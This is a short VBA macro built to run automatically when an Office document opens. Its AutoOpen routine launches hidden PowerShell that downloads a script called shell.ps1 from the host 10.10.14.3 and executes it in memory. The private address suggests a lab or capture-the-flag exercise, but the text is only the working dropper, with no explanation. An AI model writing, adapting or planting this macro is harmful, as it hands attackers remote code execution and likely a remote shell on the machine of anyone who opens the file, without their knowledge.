Sub AutoOpen()
  Dim str As String
  str = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3/shell.ps1')"
  Shell str, vbHide
End Sub

